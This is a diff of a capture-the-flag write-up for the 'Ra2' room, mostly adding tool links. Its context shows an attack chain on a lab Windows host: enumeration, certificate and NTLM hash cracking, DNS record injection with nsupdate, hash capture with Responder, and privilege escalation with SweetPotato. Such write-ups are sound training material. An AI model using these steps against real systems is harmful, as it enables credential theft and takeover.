@@ -20,7 +20,7 @@
 
 ## Nmap scan
 
-First, let's run an agressive nmap scan against the target :  
+First, let's run an agressive [nmap](https://nmap.org/book/man.html) scan against the target :  
 ```
 # Nmap 7.80 scan initiated Mon Feb 13 15:12:56 2023 as: nmap -A -p- -oN nmapResults.txt -d 10.10.35.128
 --------------- Timing report ---------------
@@ -773,7 +773,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 ## Web enumeration
 
-First, let's add the domain and subdomains we found using nmap in our `/etc/hosts` file :  
+First, let's add the domain and subdomains we found earlier with [nmap](https://nmap.org/book/man.html) in our `/etc/hosts` file :  
 ```
 attacker@AttackBox:~/Ra2$ sudo nano /etc/hosts
 attacker@AttackBox:~/Ra2$ cat /etc/hosts
@@ -787,7 +787,7 @@ ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
 ```
 
-Now, let's use gobuster to look for files and directories on `fire.windcorp.thm` :  
+Now, let's use [Gobuster](https://github.com/OJ/gobuster) to look for files and directories on `fire.windcorp.thm` :  
 ```
 attacker@AttackBox:~/Ra2$ cat gobusterResults.txt 
 /img                  (Status: 301) [Size: 153] [--> https://fire.windcorp.thm/img/]
@@ -821,7 +821,7 @@ There is two files. But we only have access to `cert.pfx`, so let's download it.
 
 ## DNS Enumeration
 
-We can use `dig` to enumerate the DNS service :  
+We can use [dig](https://linux.die.net/man/1/dig) to enumerate the DNS service :  
 ```
 attacker@AttackBox:~/Ra2$ dig @10.10.133.87 windcorp.thm any
 
@@ -853,11 +853,11 @@ fire.windcorp.thm.	3600	IN	A	192.168.112.1
 ;; MSG SIZE  rcvd: 302
 ```
 
-We have the first flag ! And it contains the hint to go further in the challenge. So we should be able to edit the dns records.
+We have the first flag ! And it contains the hint to go further in the challenge. So we should be able to edit the DNS records.
 
 ## Certificate cracking
 
-Now, let's crack the certificate we found using john :  
+Now, let's crack the certificate we found using [john](https://www.openwall.com/john/doc/) :  
 ```
 attacker@AttackBox:~/Ra2$ /opt/john/run/pfx2john.py cert.pfx > hash.txt
 attacker@AttackBox:~/Ra2$ /opt/john/run/john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
@@ -878,7 +878,7 @@ clients.
 
 ## DNS update
 
-Let's update the DNS service to impersonate `selfservice.windcorp.thm` :  
+Let's update the DNS service to impersonate `selfservice.windcorp.thm` using [nsupdate](https://linux.die.net/man/8/nsupdate) :  
 ```
 attacker@AttackBox:~/Ra2$ nsupdate
 > server 10.10.133.87
@@ -889,11 +889,11 @@ attacker@AttackBox:~/Ra2$ nsupdate
 > quit
 ```
 
-Now, we a client try to send a request to `selfservice.windcorp.thm`, the requests should be send to our attacking machine.
+Now, we a client try to send a request to `selfservice.windcorp.thm`, it should be send to our attacking machine.
 
 ## NTLM hash capture
 
-Now, we have to capture the traffic using Responder. First, we need to extract the certificate and the key from the pfx file we cracked :  
+Now, we have to capture the traffic using [Responder](https://github.com/SpiderLabs/Responder). First, we need to extract the certificate and the key from the pfx file we cracked :  
 ```
 attacker@AttackBox:~/Ra2$ openssl pkcs12 -in cert.pfx -nocerts -out responder.key
 Enter Import Password: ganteng
@@ -903,12 +903,12 @@ attacker@AttackBox:~/Ra2$ openssl pkcs12 -in cert.pfx -nokeys -out responder.crt
 Enter Import Password: ganteng
 ```
 
-Then, we have to move the two file we created (`responder.crt` and `responder.key`) to the `certs` directory of Responder :  
+Then, we have to move the two file we created (`responder.crt` and `responder.key`) to the `certs` directory of [Responder](https://github.com/SpiderLabs/Responder) :  
 ```
 attacker@AttackBox:~/Ra2$ sudo mv responder.crt responder.key /opt/Responder/certs/
 ```
 
-Finally, we can run Responder to capture requests :  
+Finally, we can run [Responder](https://github.com/SpiderLabs/Responder) to capture requests :  
 ```
 attacker@AttackBox:~/Ra2$ sudo responder.py -I tun0
                                          __
@@ -975,7 +975,7 @@ We have captured the NTLM hash of user `edwardle` !
 
 ## NTLM hash cracking
 
-Now, let's try to crack the hash we found earlier using john :  
+Now, let's try to crack the hash we found earlier using [john](https://www.openwall.com/john/doc/) :  
 ```
 attacker@AttackBox:~/Ra2$ nano ntlm.txt
 attacker@AttackBox:~/Ra2$ /opt/john/run/john ntlm.txt --wordlist=/usr/share/wordlists/rockyou.txt
@@ -1007,11 +1007,11 @@ We are member of `Account Operators` group. We may have the right to create a ne
 ## Privilege escalation
 
 We have the SeImpersonatePrivilege, and the machine is running an older version of Windows Server (Windows Server 2016). The target seems 
-to be vulnerable to PrintSpoofer. We can try to use this expoit to run arbitrary commands. First, let's crate a new user :  
+to be vulnerable to [PrintSpoofer](https://github.com/itm4n/PrintSpoofer). We can try to use this expoit to run arbitrary commands. First, let's crate a new user :  
 ![](https://i.imgur.com/e2IxtYI.jpg)  
 
 Now, let's download SweetPotato from [here](https://github.com/uknowsec/SweetPotato) and then send it to the target 
-(This exploits is based on PrintSpoofer and can run abritrary commands with full privileges) :  
+(This exploits is based on [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) and can run abritrary commands with full privileges) :  
 ![](https://i.imgur.com/KdOCOx8.jpg)  
 
 Now, we can run this exploit to add the user we created to the `Administrators` group :  
@@ -1026,10 +1026,11 @@ Now, we just have to get the final flag in `C:\Users\Administrator\Desktop\Flag 
 ## Conclusion
 
 In this room, we practiced :  
-- Services and open ports enumeration using nmap
-- Web enumeration using Gobuster and manually
-- 
+- Services and open ports enumeration using [nmap](https://nmap.org/book/man.html)
+- Web enumeration using [Gobuster](https://github.com/OJ/gobuster) and manually
+- Hash cracking using [john](https://www.openwall.com/john/doc/)
+- DNS record injection using [nsupdate](https://linux.die.net/man/8/nsupdate)
+- Windows enumeration
+- Windows privileges escalation using [SweetPotato](https://github.com/uknowsec/SweetPotato)
 
-
-
-
+Thanks for this room and thanks for reading my write ups !
